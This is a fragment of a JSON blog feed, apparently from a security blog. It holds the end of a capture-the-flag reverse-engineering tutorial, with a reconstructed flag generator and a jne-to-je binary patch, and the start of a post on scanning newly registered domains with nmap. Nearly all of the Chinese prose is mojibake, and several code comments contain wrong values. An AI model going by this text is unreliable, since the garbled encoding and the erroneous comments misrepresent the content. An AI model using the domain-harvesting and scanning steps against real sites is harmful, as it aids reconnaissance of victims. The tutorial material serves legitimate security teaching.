it?</h3>\n<p>å°±é€™æ¨£äº†å—ï¼Ÿæ˜¯ä¸æ˜¯æœ‰é»ç©ºè™›ï¼Ÿæˆ‘å€‘éƒ½é‚„æ²’çœ‹éè‡ªå®šç¾©çš„å‡½æ•¸å‘¢ï¼</p>\n<p>ç‚ºäº†ç‰©ç›¡å…¶ç”¨ï¼Œæˆ‘å€‘æ‹¿ç°¡å–®çš„ <code>print_ptr()</code> ä¾†çœ‹ä¸€ä¸‹ã€è¿´åœˆã€é•·ä»€éº¼æ¨£å­ã€‚</p>\n<p>å¾é ­ trace ä¸€ä¸‹ï¼Œç•¥éå‰é¢ function prologueï¼Œåœ¨ <code>+8</code> çš„åœ°æ–¹æŠŠåƒæ•¸ <code>rdi</code> æ”¾åˆ° <code>rbp-0x18</code>ï¼Œç„¶å¾ŒæŠŠ <code>rbp-0x4</code> è¨­æˆ 0ã€‚æ¥è‘—ï¼Œé‚è¼¯è·³åˆ° <code>+51</code> çš„åœ°æ–¹ï¼Œé€™æ™‚æˆ‘å€‘æ‰å‰›æŠŠ <code>rbp-0x4</code> è¨­æˆ 0ï¼Œè·Ÿ 0x14 åšæ¯”è¼ƒç•¶ç„¶ <code>jle</code>(<strong>j</strong>ump if <strong>l</strong>ess than or <strong>e</strong>qual)æœƒæˆç«‹ï¼Œç„¶å¾Œè·³å›åˆ° <code>+21</code> çš„åœ°æ–¹ï¼Œæœ€å¾Œå‘¼å« <code>putchar@plt (+42)</code>ã€‚å­—å…ƒå°å‡ºä¾†å¾Œï¼ŒæœƒæŠŠ <code>rbp-0x4</code> åŠ  1ï¼Œç„¶å¾Œç¹¼çºŒåˆ¤æ–·æ˜¯å¦å¤§æ–¼ 0x14ï¼Œå¦å‰‡å†åº¦è·³å› <code>+21</code> å‘¼å« <code>putchar@plt (+42)</code>ã€‚é€™å€‹ã€åŠ ä¸€ã€åˆ¤æ–·ã€çš„å¾ªç’°æœƒä¸€ç›´æŒçºŒåˆ° <code>rbp-0x4=0x15</code> ç‚ºæ­¢ï¼Œç„¶å¾Œæ•´å€‹å‡½æ•¸å°±æœƒçµæŸã€‚</p>\n<p>è°æ˜çš„ä½ ä¸€å®šç™¼ç¾äº†ï¼Œ<code>rbp-0x4</code> æ ¹æœ¬å°±æ˜¯ä¸€å€‹è¨ˆæ•¸å™¨ï¼ˆcounterï¼‰ï¼Œé€™ä¸€æ•´æ®µç¨‹å¼è·³ä¾†è·³å»å…¶å¯¦å°±æ˜¯ç‚ºäº†é‡è¤‡åŸ·è¡Œ <code>+21</code> åˆ° <code>+42</code> çš„éƒ¨åˆ†ï¼Œè·‘ä¸€å€‹ 0x15 æ¬¡ï¼ˆ0 åˆ° 0x14ï¼‰çš„è¿´åœˆé€å€‹å°å‡º <code>gen()</code> ç”¢ç”Ÿçš„ flag çš„æ¯ä¸€å€‹å­—å…ƒã€‚å› çˆ²å¯¦åœ¨å¤ªçŸ­äº†ï¼Œæˆ‘ç›´æ¥æŠŠé‚„åŸçš„ cpp å¯«åœ¨é€™ï¼š</p>\n<pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>  <br>    <span class=\"token function\">put_char</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™ç¨®å¾ˆçŸ­çš„ã€åŠ æ¸›ï¼‹åˆ¤æ–·ï¼‹ jumpã€çµ„åˆï¼Œå¸¸å¸¸éƒ½æ˜¯è¿´åœˆçš„é‚è¼¯å–”ï¼</p>\n<p>å†ä¾†çœ‹çœ‹é€™é¡Œæœ€è¤‡é›œçš„ <code>gen()</code>ï¼Œå› ç‚ºä»–çš„çµ„èªå¤ªé•·æˆ‘å°±ä¸æ”¾ä¸Šä¾†äº†ï¼Œè«‹è‡ªå·±æ“ä½œé…è‘—ä»¥ä¸‹æ•˜è¿°è§€å¯Ÿæ€è€ƒã€‚<code>gen()</code> çš„é‚è¼¯æ˜¯å…ˆç”¨ <code>malloc()</code> æ‹¿åˆ°ä¸€å¡Šè¨˜æ†¶é«”ï¼Œç„¶å¾Œä½¿ç”¨åƒæ•¸å€¼ï¼Œä¹Ÿå°±æ˜¯ä¸‰å€‹æ•¸å­—çš„ç¸½å’Œï¼ˆå°±æ˜¯ 1337 å•¦ï¼‰é€²è¡Œä¸€äº›é‹ç®—ä¾†ç”¢ç”Ÿ flagã€‚å°æé†’ï¼šå­—ä¸²æ˜¯ç”±è¨±å¤šé€£çºŒçš„å­—å…ƒæˆ–ä½å…ƒæ§‹æˆï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥ç”¨ã€å­—ä¸²é ­çš„è¨˜æ†¶é«”ä½ç½®ã€åŠ ä¸Šã€ç¬¬å¹¾å€‹å­—å…ƒã€ä¾†åš string indexingã€‚</p>\n<p>æœ‰èˆˆè¶£å¤šç·´ç¿’çš„äººå¯ä»¥è©¦è‘—è‡ªå·± reverse çœ‹çœ‹ <code>gen()</code>ï¼Œæˆ‘åœ¨é€™è£¡ä¹Ÿé™„ä¸Šåƒè€ƒçš„ cpp code é‚„æœ‰ ascii decode çµæœã€‚</p>\n<pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> <span class=\"token function\">gen</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 0x16 = 22 (dec)</span><br>  <br>    <span class=\"token operator\">*</span>result <span class=\"token operator\">=</span> <span class=\"token number\">121</span><span class=\"token punctuation\">;</span>                           <span class=\"token comment\">// 0x79 = 121     -> 'y'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>a<span class=\"token operator\">/</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span> <span class=\"token operator\">-</span><span class=\"token number\">7</span> <span class=\"token operator\">+</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 0x30 = '0'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> <span class=\"token number\">0x3c</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 0x529+0x3c=0x75 ->'u'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'_'</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// 0x5f = '_'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 0x75-0x14=0x61 -> 'a'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 0x61-0x03=0x64 -> 'd'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 'd'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// 'e'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 'd'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// '_'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 't'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 0x74-0xc=0x68 -> 'h'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'r'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'e'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'e'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                  <span class=\"token comment\">// '_'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x6e</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'n'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                  <span class=\"token comment\">// 'u'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 0x6e-0x1=0x6d -> 'm'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 's'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// '!'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// '\\n'</span><br><br>    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"patching\"><a class=\"direct-link\" href=\"#patching\">#</a> Patching</h3>\n<p>æœ€å¾ŒçµæŸå‰ä¾†è¬›å¦ä¸€å€‹ä¸éŒ¯çš„æƒ³æ³•ï¼šç›´æ¥æ›´æ”¹åˆ¤æ–·å¼ patch binary è®“å°å‡º flag çš„æ¢ä»¶æˆç«‹ï¼Œé€™æ¨£å°±ä¸ç”¨ç®¡æ¢ä»¶å•¦ï¼</p>\n<p>Patching çš„ç¢ºæ˜¯ä¸€å€‹å¸¸è¦‹åˆç°¡å–®çš„æ–¹æ³•çš„æ–¹æ³•ï¼Œé€™é¡Œåªè¦æŠŠ <code>main+133</code> çš„ <code>jne 0x400bcc</code> æ”¹æˆç›¸åçš„ <code>je 0x400bcc</code> å°±å¯ä»¥è§¸ç™¼å°å‡º flag çš„é‚è¼¯ã€‚</p>\n<p>æˆ‘å€‘å¾ assembly dump å¯ä»¥çœ‹åˆ° <code>jne 0x400bcc</code> åœ¨ <code>0x400ba3</code> çš„åœ°æ–¹ã€‚å¦å¤–ï¼Œå¾ ELF header å¯ä»¥çœ‹åˆ°ç¨‹å¼è·‘èµ·ä¾†æœƒè¢« load åœ¨ <code>0x400000</code> çš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘å€‘åœ¨ ELF ä¸­è¦æ‰¾çš„å°±æ˜¯ <code>0x400ba3â€Šâ€”â€Š0x400000 = 0xba3</code> é€™å€‹ offsetã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/codebase.png\" /><figcaption><p>find codebase</p>\n</figcaption></figure></p>\n<p>æˆ‘å€‘å¯ä»¥ç”¨ vim + xxd mode æ‰¾åˆ° <code>0xba3</code> çš„ä½ç½®ï¼ˆè¨˜å¾— little endian å—ï¼‰ï¼Œçœ‹åˆ°ä»£è¡¨ <code>jne</code> çš„ 75ã€‚å†ä¾†åªè¦æŠŠå®ƒç·¨è¼¯æˆä»£è¡¨ <code>je</code> çš„ 74 å†å­˜æª”ï¼Œæˆ‘å€‘å°± patch å¥½äº†ï¼</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/xxd-patch.png\" /><figcaption><p>patch in vim+xxd</p>\n</figcaption></figure></p>\n<p>æ–¼æ˜¯æˆ‘å€‘å¾ˆèˆˆå¥®åœ°æŠŠå®ƒè·‘èµ·ä¾†ï¼Œç‚ºäº†ç¢ºå®šçœŸçš„æœ‰å½±éŸ¿ã€å° flag çš„é‚è¼¯ã€é‚„å…ˆè¼¸å…¥æ­£ç¢ºæ•¸å­—ä¸¦çœ‹åˆ°ç¢ºå¯¦å‡ºç¾ â€œnopeâ€ã€‚çµæœâ€¦ flag æ€éº¼æ˜¯å€‹äº‚ä¸ƒå…«ç³Ÿçš„æ±è¥¿ï¼</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/messed-flag.png\" /><figcaption><p>messed up!</p>\n</figcaption></figure></p>\n<p>æŠ±æ­‰å•¦ï¼Œå‡ºé¡Œè€…ç‚ºäº†é˜²æ­¢é€™ç¨®è§£æ³•ï¼ŒåŠ äº†ç”¢ç”Ÿ flag çš„ <code>gen()</code>ï¼Œæ‰€ä»¥æ•¸å­—ç¸½åˆå¦‚æœä¸æ˜¯ 1337ï¼Œç”¢å‡ºçš„ flag ä¹Ÿæœƒæ˜¯ä¸å°çš„ï¼</p>\n<p>ï¼ˆä½œè€… murmurï¼šè€Œä¸”çœ‹å‡ºé‚è¼¯æ˜¯ä¸‰æ•¸ç¸½åˆæ‡‰è©²é‚„æ¯” patch ç°¡å–®å§ï¼Ÿ</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>æ­å–œå¤§å®¶æˆåŠŸ reverse äº†ç¬¬ä¸€éš»å°ç¨‹å¼ï¼Œçœ‹æ‡‚é‚è¼¯çš„å‰é‚£æœ‰æ²’æœ‰è¦ºå¾—æˆå°±æ„Ÿçˆ†æ£šå‘¢ï¼é›–ç„¶é€™æ˜¯é‚è¼¯éå¸¸ç›´è§€çš„é¡Œç›®ï¼Œä¸éç·´ç¿’åˆ¤æ–·ç¨‹å¼ä¸­ã€å“ªè£¡æ˜¯é‡è¦é‚è¼¯ã€æ˜¯æˆç‚ºé€†å‘å¤§å¸«çš„é—œéµç¬¬ä¸€æ­¥ï¼</p>\n<p>ä½œç‚ºé€²éšä¸€é»çš„æŒ‘æˆ°ï¼Œä½ å¯ä»¥è©¦è©¦è‡ªå·±å¯«ä¸€éš» hello world å°ç¨‹å¼ï¼Œçœ‹çœ‹ compile æˆä¸åŒæ¶æ§‹è·Ÿè™•ç†å™¨å¾Œå† disassemble æœ‰ä½•ä¸åŒå–”ï¼</p>\n<h4 id=\"%E5%82%99%E8%A8%BB%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%82%99%E8%A8%BB%EF%BC%9A\">#</a> å‚™è¨»ï¼š</h4>\n<p><code>lea</code> å’Œ <code>mov</code> æœ‰ä½•ä¸åŒï¼Ÿæ›´ç²¾ç¢ºä¸€äº›ï¼Œä¸‹é¢é€™å…©ç¨®æœ‰ä½•ä¸åŒï¼Ÿ</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">LEA rax, [RBP+5] ; Compute address of valueMOV rax, [RBP+5] ; Load value at that address</code></pre>\n<p><code>lea</code> ä»£è¡¨ load effective addressï¼Œè£åˆ°æš«å­˜å™¨çš„æ˜¯ã€æŒ‡åˆ°ç›®æ¨™è¨˜æ†¶é«”çš„ pointerã€ï¼Œå¸¸ç”¨æ–¼è¨˜æ†¶é«”ä½ç½®é‹ç®—ã€‚</p>\n<p><code>mov</code> ä»£è¡¨ load valueï¼Œè£åˆ°æš«å­˜å™¨çš„æ˜¯ã€ç›®æ¨™è¨˜æ†¶é«”å…§çš„å€¼ã€ï¼Œå¸¸ç”¨æ–¼å€¼çš„é‹ç®—èˆ‡å‚³éã€‚</p>\n",
      "date_published": "2021-07-30T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/website-go-live-attack/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/website-go-live-attack/",
      "title": "ç‚ºä»€éº¼ç¶²ç«™æ‰å‰›ä¸Šç·šå°±è¢«æ”»æ“Šï¼Ÿ",
      "content_html": "<p><img src=\"/img/posts/nick/website-go-live-attack/1.jpg\" alt=\"Photo by Arget on Unsplash\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<!-- å‰›å‡ºç”Ÿçš„å¬°å…’æœ€å¥½æ¬ºè² ï¼Œç¶²ç«™ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œç¶²ç«™åˆå»ºæ™‚ä¸ç®¡æ˜¯ç‚ºäº†æ–¹ä¾¿æ¸¬è©¦æˆ–ç¶­è­·ï¼Œéƒ½æœƒå°å¤–é–‹æ”¾è¼ƒå¤šçš„æœå‹™ï¼Œé§­å®¢ä¹Ÿå®¹æ˜“åœ¨æ­¤æ™‚è¶è™›è€Œå…¥ã€‚æœ¬æ–‡å°‡ä»‹ç´¹å¾é€™äº›å‰›ä¸Šç·šçš„ç¶²ç«™ä¸­æ•´ç†å‡ºçš„ 5 ç¨®æœ€å¸¸è¦‹å»æœ‰å¼±é»çš„æœå‹™ã€‚-->\n<!-- summary -->\n<p>å‰›å‡ºç”Ÿçš„å¬°å…’æœ€å¥½æ¬ºè² ï¼Œç¶²ç«™ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œç¶²ç«™åˆå»ºæ™‚ä¸ç®¡æ˜¯ç‚ºäº†æ–¹ä¾¿æ¸¬è©¦æˆ–ç¶­è­·ï¼Œéƒ½æœƒå°å¤–é–‹æ”¾è¼ƒå¤šçš„æœå‹™ï¼Œé§­å®¢ä¹Ÿå®¹æ˜“åœ¨æ­¤æ™‚è¶è™›è€Œå…¥ã€‚<br>\næœ¬æ–‡æœƒå…ˆç°¡å–®ä»‹ç´¹ä¸€ä¸‹é§­å®¢å¦‚ä½•æ‰¾åˆ°æ–°å»ºç«‹çš„ç¶²ç«™ï¼Œä¸¦å¯¦æ¸¬ä¸€ä¸‹é€™å€‹æ–¹æ³•å¯ä»¥æ‰¾å‡ºå¤šå°‘ 7 å¤©å…§æ¶è¨­çš„ç¶²ç«™ï¼Œå†å¾é€™äº›ç¶²ç«™çš„æƒæçµæœä¸­æ•´ç†å‡º 5 ç¨®æœ€å¸¸è¦‹ä¸”æœ‰å¼±é»çš„æœå‹™ï¼Œä¸¦è¨è«–ä¸€ä¸‹å¼±é»å¯èƒ½å¸¶ä¾†çš„é¢¨éšªèˆ‡é˜²ç¯„æ–¹å¼ ã€‚</p>\n<h2 id=\"%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\"><a class=\"direct-link\" href=\"#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\">#</a> å·¥å…·ä»‹ç´¹</h2>\n<p>é€™é‚Šä»‹ç´¹å…©å€‹æ¸¬è©¦ä¸­ç”¨åˆ°çš„å·¥å…·ï¼Œç¬¬ä¸€å€‹å·¥å…·æ•´ç†äº†æ¯å¤©æœ‰å“ªäº›äººä¾†ç”³è«‹æ–°çš„ç¶²åŸŸï¼Œå› ç‚ºæ–°ç¶²åŸŸä¸Šå¤§å¤šä¹Ÿæ˜¯æ–°å»ºç«‹çš„ç¶²ç«™ï¼Œæ‰€ä»¥é€™äº›ç¶²åŸŸä¸Šçš„ç¶²ç«™å°±æ˜¯æˆ‘å€‘çš„æ¸¬è©¦å°è±¡ã€‚å¦å¤–ä¸€å€‹å·¥å…·å‰‡æ˜¯å»æƒæé€™äº›ç¶²ç«™é–‹æ”¾äº†é‚£äº›æœå‹™ã€‚</p>\n<h3 id=\"1.-whois-data-center\"><a class=\"direct-link\" href=\"#1.-whois-data-center\">#</a> 1. Whois Data Center</h3>\n<p><img src=\"/img/posts/nick/website-go-live-attack/2.jpg\" alt=\"Photo by Arget on Unsplash\"></p>\n<h3 id=\"%E7%B0%A1%E4%BB%8B-%3A\"><a class=\"direct-link\" href=\"#%E7%B0%A1%E4%BB%8B-%3A\">#</a> ç°¡ä»‹ :</h3>\n<p>Whois Data Center æ”¶é›†äº†å¾ 1985 å¹´ä»¥ä¾†å…¨çƒ Whois è³‡æ–™åº«çš„æ•¸æ“šï¼Œæ›´é‡è¦çš„æ˜¯å°‡äº›é¾å¤§çš„æ•¸æ“šæ•´ç†èˆ‡åˆ†é–€åˆ¥é¡ï¼Œåƒæ˜¯æ–°è¨»å†Šçš„ç¶²åŸŸã€å³å°‡éæœŸçš„ç¶²åŸŸã€å·²ç¶“åˆªé™¤çš„ç¶²åŸŸç­‰ç­‰ï¼Œå¯æƒœçš„æ˜¯å¤§éƒ¨ä»½åŠŸèƒ½èˆ‡è³‡æ–™éƒ½è¦æ”¶è²»ã€‚</p>\n<h3 id=\"%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AD%98-%3A\"><a class=\"direct-link\" href=\"#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AD%98-%3A\">#</a> èƒŒæ™¯çŸ¥è­˜Â :</h3>\n<h4 id=\"%E7%B6%B2%E5%9F%9F(domain)%3A\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E5%9F%9F(domain)%3A\">#</a> ç¶²åŸŸ(Domain):</h4>\n<p>åœ¨ç¶²è·¯çš„ä¸–ç•Œä¸­ï¼Œç¶²ç«™æœƒæœ‰ä¸€çµ„ IP ä½å€ï¼Œä½¿ç”¨è€…å¯åœ¨ç€è¦½å™¨è¼¸å…¥ IP ä½å€ä¾†æ‰¾åˆ°å°æ‡‰çš„ç¶²ç«™ã€‚ä¸é IP ä½å€æ˜¯ä¸€çµ„ä¸å®¹æ˜“è¨˜æ†¶çš„æ•¸å­—ã€‚ç‚ºäº†è®“ç€è¦½ç¶²ç«™æ›´å®¹æ˜“ï¼Œç¶²åŸŸçš„æ¦‚å¿µä¾¿æ‡‰é‹è€Œç”Ÿï¼Œç°¡å–®ä¸€é»èªªå°±æ˜¯å¹³å¸¸åœ¨ç¶²å€åˆ—çœ‹åˆ°é™¤äº† http:// é–‹é ­çš„é‚£ä¸€æ®µ(ex. <a href=\"http://google.com\">google.com</a>)ã€‚</p>\n<h4 id=\"whois-%3A\"><a class=\"direct-link\" href=\"#whois-%3A\">#</a> WhoisÂ :</h4>\n<p>ç¶²ç«™åœ¨ç”³è«‹ç¶²åŸŸå¾Œï¼Œè² è²¬ç®¡ç† Domainèˆ‡ IP çš„è¨»å†Šå•†æœƒä¾ç…§ ICANN(è¨» 1) çš„è¦å®šå°‡è³‡è¨Šå…¬é–‹åœ¨ Whois è³‡æ–™åº«ã€‚Whois æ˜¯éé›†ä¸­ç®¡ç†å¼çš„è³‡æ–™åº«ï¼Œè¨»å†Šæ•¸æ“šä¿å­˜åœ¨ä¸åŒçš„ä½ç½®ï¼Œä¸¦ç”±è¤‡æ•¸è¨»å†Šå•†å…±åŒç®¡ç†ï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥è—‰ç”± Whois æŸ¥è©¢åˆ°åŸŸåçš„æ“æœ‰è€…èˆ‡è¯ç¹«ä¿¡æ¯ï¼Œè¯ç¹«ä¿¡æ¯ä¸­åŒ…æ‹¬éƒµå¯„åœ°å€ã€é›»è©±è™Ÿç¢¼å’Œé›»å­éƒµä»¶ã€‚</p>\n<h3 id=\"%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A\"><a class=\"direct-link\" href=\"#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A\">#</a> ä½¿ç”¨æ–¹å¼Â :</h3>\n<p>é€™æ¬¡æˆ‘å€‘æœƒç”¨åˆ°çš„æ˜¯æ–°è¨»å†Šçš„ç¶²åŸŸï¼Œåœ¨ Whois Data Center æœ€è¿‘ 7 å¤©çš„æ–°è¨»å†Šç¶²åŸŸè³‡æ–™æ˜¯å…è²»çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¸‹è¼‰ï¼ŒåŒ…å«é§­å®¢ã€‚<br>\nä¸‹è¼‰ä½ç½®Â : <a href=\"https://whoisdatacenter.com/free-database\">https://whoisdatacenter.com/free-database</a></p>\n<h3 id=\"2.-nmap\"><a class=\"direct-link\" href=\"#2.-nmap\">#</a> 2. NMAP</h3>\n<p><img src=\"/img/posts/nick/website-go-live-attack/3.jpg\" alt=\"Photo by Arget on Unsplash\"></p>\n<h3 id=\"%E7%B0%A1%E4%BB%8B-%3A-2\"><a class=\"direct-link\" href=\"#%E7%B0%A1%E4%BB%8B-%3A-2\">#</a> ç°¡ä»‹ :</h3>\n<p>NMAP(Network Mapper)æ˜¯ä¸€æ¬¾é–‹æºçš„ç¶²çµ¡æ¢æ¸¬å’Œå®‰å…¨å¯©æ ¸çš„å·¥å…·ã€‚å®ƒçš„è¨­è¨ˆç›®æ¨™æ˜¯å¿«é€Ÿåœ°æƒæå¤§å‹ç¶²è·¯ã€‚NMAPçš„åŠŸèƒ½éå¸¸è±å¯Œå…‰ä»‹ç´¹å°±å¯ä»¥å¯«æ•¸ç¯‡æ–‡ç« ï¼Œæ‰€ä»¥é€™é‚Šåªè‘—é‡åœ¨æ¸¬è©¦ä¸­æœ‰ç”¨åˆ°çš„åŠŸèƒ½ã€‚</p>\n<h3 id=\"%E5%AE%89%E8%A3%9D%E6%96%B9%E5%BC%8F-%3A\"><a class=\"direct-link\" href=\"#%E5%AE%89%E8%A3%9D%E6%96%B9%E5%BC%8F-%3A\">#</a> å®‰è£æ–¹å¼Â :</h3>\n<p>Linux(Debain) ç³»çµ±å¯åƒè€ƒä¸‹åˆ—å‘½ä»¤å®‰è£ï¼ŒWindows å‰‡éœ€å¾åˆ°å®˜ç¶²ä¸‹è¼‰å®‰è£æª”ã€‚</p>\n<pre><code>sudo apt-get install nmap\n</code></pre>\n<h3 id=\"%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A-2\"><a class=\"direct-link\" href=\"#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A-2\">#</a> ä½¿ç”¨æ–¹å¼Â :</h3>\n<p>NMAP é è¨­æœƒæƒæœ€å¸¸è¦‹çš„ 1000 å€‹ Portï¼ŒT4 èˆ‡ sS éƒ½æ˜¯åŠ é€Ÿæƒæçš„é¸é …ã€‚</p>\n<pre><code>nmap -T4 -sS example.com\n</code></pre>\n<h2 id=\"%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\">#</a> å¯¦ä¾‹åˆ†äº«</h2>\n<p>å¾ Whois Data Center 